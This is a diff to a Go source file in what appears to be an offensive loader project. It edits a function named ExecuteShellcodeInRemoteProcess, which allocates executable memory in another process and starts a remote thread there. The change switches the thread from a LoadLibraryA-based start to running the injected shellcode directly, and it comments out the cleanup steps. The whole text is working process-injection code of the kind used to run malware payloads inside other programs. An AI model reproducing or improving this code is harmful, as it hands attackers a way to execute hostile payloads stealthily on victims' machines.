@@ -2,7 +2,6 @@ package loaders
 
 import (
 	"fmt"
-	"syscall"
 	"unsafe"
 
 	"github.com/mszatanik/goloader/pkg/win32"
@@ -28,7 +27,7 @@ func ExecuteShellcodeInRemoteProcess(bytes []byte, pid uint32) {
 		0,
 		uintptr(len(bytes)),
 		win32.MEM_COMMIT|win32.MEM_RESERVE,
-		//PAGE_READWRITE,
+		//win32.PAGE_READWRITE,
 		win32.PAGE_EXECUTE_READWRITE,
 	)
 	if err != nil && addr == 0 {
@@ -47,38 +46,38 @@ func ExecuteShellcodeInRemoteProcess(bytes []byte, pid uint32) {
 	}
 
 	//VirtualProtectEx
-	// oldProt, err := VirtualProtectExCall(
+	// oldProt, err := win32.VirtualProtectExCall(
 	// 	remoteProcHandle,
 	// 	addr,
 	// 	uintptr(len(bytes)),
-	// 	PAGE_EXECUTE_READWRITE,
+	// 	win32.PAGE_EXECUTE_READWRITE,
 	// )
 	// if err != nil {
 	// 	panic(fmt.Sprintf("[-] VirtualProtectEx failed: %s\r\n%d", err, oldProt))
 	// }
 
 	// GetProcAddress
-	loadLibraryAPointer, err := syscall.BytePtrFromString("LoadLibraryA")
-	if err != nil {
-		panic(fmt.Sprintf("[-] LoadLibraryA conversion failed: %s", err))
-	}
+	// loadLibraryAPointer, err := syscall.BytePtrFromString("LoadLibraryA")
+	// if err != nil {
+	// 	panic(fmt.Sprintf("[-] LoadLibraryA conversion failed: %s", err))
+	// }
 
-	loadLibraryAAddress, err := win32.GetProcAddressCall(win32.Kernel32.Handle(), (uintptr)(unsafe.Pointer(loadLibraryAPointer)))
-	_, _, err = win32.GetProcAddress.Call(
-		win32.Kernel32.Handle(),
-		(uintptr)(unsafe.Pointer(loadLibraryAPointer)),
-	)
-	if loadLibraryAAddress == 0 {
-		panic(fmt.Sprintf("[-] GetProcAddress failed: %s", err))
-	}
+	// loadLibraryAAddress, err := win32.GetProcAddressCall(win32.Kernel32.Handle(), (uintptr)(unsafe.Pointer(loadLibraryAPointer)))
+	// _, _, err = win32.GetProcAddress.Call(
+	// 	win32.Kernel32.Handle(),
+	// 	(uintptr)(unsafe.Pointer(loadLibraryAPointer)),
+	// )
+	// if loadLibraryAAddress == 0 {
+	// 	panic(fmt.Sprintf("[-] GetProcAddress failed: %s", err))
+	// }
 
 	// CreateRemoteThread
 	remoteThread, err := win32.CreateRemoteThreadCall(
 		remoteProcHandle,
 		0,
 		0,
-		loadLibraryAAddress,
 		addr,
+		0,
 		0,
 	)
 	if remoteThread == 0 {
@@ -95,25 +94,30 @@ func ExecuteShellcodeInRemoteProcess(bytes []byte, pid uint32) {
 	}
 
 	// GetExitCodeThread
-	exitCode, err := win32.GetExitCodeThreadCall(remoteThread)
-	if exitCode == 0 {
-		panic(fmt.Sprintf("[-] GetExitCodeThread failed: %s", err))
-	}
+	// exitCode, err := win32.GetExitCodeThreadCall(remoteThread)
+	// if exitCode == 0 {
+	// 	panic(fmt.Sprintf("[-] GetExitCodeThread failed: %s", err))
+	// }
 
 	// CloseHandle
-	exitCode, err = win32.CloseHandleCall(remoteThread)
+	exitCode, err := win32.CloseHandleCall(remoteThread)
+	if exitCode == 0 {
+		panic(fmt.Sprintf("[-] remoteProcHandle failed: %s", err))
+	}
+
+	exitCode, err = win32.CloseHandleCall(remoteProcHandle)
 	if exitCode == 0 {
 		panic(fmt.Sprintf("[-] remoteProcHandle failed: %s", err))
 	}
 
 	// VirtualFreeEx
-	exitCode, err = win32.VirtualFreeExCall(
-		remoteProcHandle,
-		addr,
-		0,
-		win32.MEM_RELEASE,
-	)
-	if exitCode == 0 {
-		panic(fmt.Sprintf("[-] VirtualFreeEx failed: %s", err))
-	}
+	// exitCode, err = win32.VirtualFreeExCall(
+	// 	remoteProcHandle,
+	// 	addr,
+	// 	0,
+	// 	win32.MEM_RELEASE,
+	// )
+	// if exitCode == 0 {
+	// 	panic(fmt.Sprintf("[-] VirtualFreeEx failed: %s", err))
+	// }
 }
